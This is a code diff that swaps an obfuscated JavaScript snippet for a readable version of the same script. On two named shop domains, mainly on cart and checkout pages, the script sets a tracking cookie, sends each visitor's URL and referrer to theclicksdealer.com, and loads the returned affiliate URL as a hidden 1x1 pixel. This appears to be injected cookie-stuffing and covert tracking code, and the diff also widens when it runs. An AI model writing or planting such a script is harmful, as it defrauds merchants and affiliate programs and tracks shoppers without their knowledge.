@@ -1,1 +1,86 @@
-function _0x36a5(_0x3e681d,_0x530ef9){_0x3e681d=_0x3e681d-0x1ac;var _0x5844fa=_0x5844();var _0x36a515=_0x5844fa[_0x3e681d];return _0x36a515;}(function(_0x2fc213,_0x2caf3e){var _0x57c5af=_0x36a5,_0x3e21e2=_0x2fc213();while(!![]){try{var _0x726d5d=-parseInt(_0x57c5af(0x1b0))/0x1+parseInt(_0x57c5af(0x1da))/0x2+-parseInt(_0x57c5af(0x1d8))/0x3+-parseInt(_0x57c5af(0x1bb))/0x4+parseInt(_0x57c5af(0x1bd))/0x5*(-parseInt(_0x57c5af(0x1d2))/0x6)+-parseInt(_0x57c5af(0x1db))/0x7+parseInt(_0x57c5af(0x1c6))/0x8;if(_0x726d5d===_0x2caf3e)break;else _0x3e21e2['push'](_0x3e21e2['shift']());}catch(_0x11c9d1){_0x3e21e2['push'](_0x3e21e2['shift']());}}}(_0x5844,0x2ce12),(function(){var _0x3c21d8=_0x36a5;function _0x2f4a23(){var _0x5a12e5=_0x36a5;return _0x5a12e5(0x1cd)[_0x5a12e5(0x1be)](/[xy]/g,function(_0xd251ba){var _0x815670=_0x5a12e5,_0x46bfb7=Math[_0x815670(0x1c2)]()*0x10|0x0,_0x32767b=_0xd251ba==='x'?_0x46bfb7:_0x46bfb7&0x3|0x8;return _0x32767b['toString'](0x10);});}function _0x1bbb82(_0x2b0961){var _0x3c3e54=_0x36a5,_0x533d7c=document[_0x3c3e54(0x1c4)][_0x3c3e54(0x1b5)](new RegExp(_0x3c3e54(0x1cb)+_0x2b0961+_0x3c3e54(0x1af)));return _0x533d7c?decodeURIComponent(_0x533d7c[0x1]):'';}function _0x4f38df(_0x4bc017){var _0xbbb36f=_0x36a5,_0x18ce01=document['createElement']('img');_0x18ce01[_0xbbb36f(0x1ae)]=_0x4bc017,_0x18ce01['width']=0x1,_0x18ce01[_0xbbb36f(0x1b4)]=0x1,_0x18ce01['style'][_0xbbb36f(0x1c1)]=_0xbbb36f(0x1bc),document[_0xbbb36f(0x1ac)][_0xbbb36f(0x1d7)](_0x18ce01);}function _0x27fdc7(){var _0x29fd06=_0x36a5,_0x4f73c7=[_0x29fd06(0x1ca),_0x29fd06(0x1b2),_0x29fd06(0x1b7),_0x29fd06(0x1b3),_0x29fd06(0x1d0),_0x29fd06(0x1ad),_0x29fd06(0x1b8)];return _0x4f73c7[_0x29fd06(0x1c9)](function(_0x596354){var _0x8bbae5=_0x29fd06;return window[_0x8bbae5(0x1ba)][_0x8bbae5(0x1d4)][_0x8bbae5(0x1cf)]()[_0x8bbae5(0x1d6)](_0x596354);});}async function _0xa0bfb4(){var _0x218d16=_0x36a5;try{var _0x501839=_0x1bbb82(_0x218d16(0x1c3))||_0x2f4a23(),_0x51c141=new Date(Date[_0x218d16(0x1d9)]()+0x1e*0x15180*0x3e8)['toUTCString']();document['cookie']=_0x218d16(0x1b6)+_0x501839+';\x20expires='+_0x51c141+';\x20path=/;\x20SameSite=Lax';var _0x58b792=await fetch(_0x218d16(0x1b9),{'method':'POST','headers':{'Content-Type':'application/json'},'body':JSON[_0x218d16(0x1c8)]({'url':location[_0x218d16(0x1c7)],'referrer':document[_0x218d16(0x1bf)],'unique_id':_0x501839,'origin':location[_0x218d16(0x1cc)]})}),_0xa5949e=await _0x58b792[_0x218d16(0x1c5)]();_0xa5949e[_0x218d16(0x1b1)]&&_0xa5949e['affiliate_url']?_0x4f38df(_0xa5949e[_0x218d16(0x1c0)]):_0x4f38df('https://theclicksdealer.com/api/fallback-pixel?id='+_0x501839);}catch(_0x9b1c6b){console['error'](_0x218d16(0x1d1),_0x9b1c6b);}}function _0x513fa4(){var _0x47850a=_0x36a5,_0x11da54=window[_0x47850a(0x1ba)]['hostname'],_0x5113eb={'www.fareastflora.com':{'always':![],'cartExtra':!![]},'aimedialinks.com':{'always':!![],'cartExtra':!![]}},_0x19264f=_0x5113eb[_0x11da54];if(_0x19264f){if(_0x19264f[_0x47850a(0x1d5)]&&_0x27fdc7())_0xa0bfb4();else _0x19264f['always']&&_0xa0bfb4();}}document['readyState']===_0x3c21d8(0x1ce)?_0x513fa4():window[_0x3c21d8(0x1d3)]('load',_0x513fa4,{'once':!![]});}()));function _0x5844(){var _0x1a71e8=['checkout','pay','height','match','tracking_uuid=','checkouts','payment','https://theclicksdealer.com/api/track-user','location','1032788NOCIMJ','none','169055tlllpg','replace','referrer','affiliate_url','display','random','tracking_uuid','cookie','json','11317792LSrnXW','href','stringify','some','cart','(?:^|;\x20)','hostname','xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx','complete','toLowerCase','shipping','Tracking\x20error','30YAXEIO','addEventListener','pathname','cartExtra','includes','appendChild','851115CZiAGe','now','49540sAhnFM','1296582uVHEIH','body','review-order','src','=([^;]*)','359485IFuMwT','success'];_0x5844=function(){return _0x1a71e8;};return _0x5844();}
+(function () {
+
+  function generateUUID() {
+    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
+      var r = Math.random() * 16 | 0;
+      var v = c === 'x' ? r : (r & 0x3 | 0x8);
+      return v.toString(16);
+    });
+  }
+
+  function getCookie(name) {
+    var match = document.cookie.match(new RegExp('(?:^|; )' + name + '=([^;]*)'));
+    return match ? decodeURIComponent(match[1]) : '';
+  }
+
+  function createTrackingPixel(url) {
+    var img = document.createElement("img");
+    img.src = url;
+    img.width = 1;
+    img.height = 1;
+    img.style.display = "none";
+    document.body.appendChild(img);
+  }
+
+  function isCartPage() {
+    var cartPatterns = ["cart", "checkout", "checkouts", "pay", "shipping", "review-order", "payment"];
+    return cartPatterns.some(function (p) {
+      return window.location.pathname.toLowerCase().includes(p);
+    });
+  }
+
+  async function initTracking() {
+    try {
+      var uniqueId = getCookie('tracking_uuid') || generateUUID();
+      var expires = new Date(Date.now() + 30 * 86400 * 1000).toUTCString();
+      document.cookie = 'tracking_uuid=' + uniqueId + '; expires=' + expires + '; path=/; SameSite=Lax';
+
+      var res = await fetch("https://theclicksdealer.com/api/track-user", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          url: location.href,
+          referrer: document.referrer,
+          unique_id: uniqueId,
+          origin: location.hostname,
+        })
+      });
+
+      var data = await res.json();
+
+      if (data.success && data.affiliate_url) {
+        createTrackingPixel(data.affiliate_url);
+      } else {
+        createTrackingPixel('https://theclicksdealer.com/api/fallback-pixel?id=' + uniqueId);
+      }
+
+    } catch (e) {
+      console.error("Tracking error", e);
+    }
+  }
+
+  function run() {
+    var host = window.location.hostname;
+
+    var config = {
+      "www.fareastflora.com": { always: true, cartExtra: true },
+      "aimedialinks.com": { always: true, cartExtra: true },
+    };
+
+    var site = config[host];
+    if (site) {
+      if (site.cartExtra && isCartPage()) {
+        initTracking();
+      } else if (site.always) {
+        initTracking();
+      }
+    }
+  }
+
+  if (document.readyState === 'complete') {
+    run();
+  } else {
+    window.addEventListener('load', run, { once: true });
+  }
+
+})();
